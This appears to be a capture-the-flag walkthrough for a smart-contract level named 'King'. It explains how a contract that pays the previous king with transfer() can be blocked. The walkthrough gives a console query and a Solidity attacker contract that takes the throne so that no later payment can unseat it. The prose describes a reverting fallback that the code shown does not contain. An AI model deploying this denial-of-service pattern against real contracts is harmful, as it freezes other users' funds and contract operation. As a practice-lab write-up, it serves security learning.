# 👑

The goal of this level is to prevent the contract from regaining kingship when you submit your instance back, which it does in it's fallback function.

When we send ether to another contract, we depend on said contract to correctly handle the transaction. So, if we want the `King` contract to not reclaim kingship, *we need to force it to mishandle a transaction*.

Here are 3 ways a transaction may fail:
1. The receiving contract doesn't have a payable fallback function - will throw an error.
2. The receiving contract has a malicious payable fallback - will throw an exception.
3. The receiving contract has a malicious payable function that consumes tons of gas - will fail or over-consumes your gas limit.

To solve this challenge, we'll go with number 2 above.

We can see in the contract that kingship is switched in the `receive` function. The key thing to notice is that the previous `king` is sent eth via `transfer(msg.value)` - what if the previous `king` doesn't have a fallback or `receive` function? Ding ding ding.

## Solution
1. Check how much wei is required to claim kingship
```javascript
// in your console
await contract.prize().then(v => v.toString())
// Output: '1000000000000000'
```
2. Create a malicious contract in Remix. Here, we create a single payable fallback function which immediately reverts the transaction and stops the switch of kingship.

```javascript
contract Caligula {
    // pass your contract instance to _oldKing
    function claimTheThrone(address payable _oldKing) public payable {
        // make sure to send enough wei to overtake the current king
        (bool sent, ) = _oldKing.call{value: msg.value}("");
        if(!sent) revert("mine now");
    }

}
```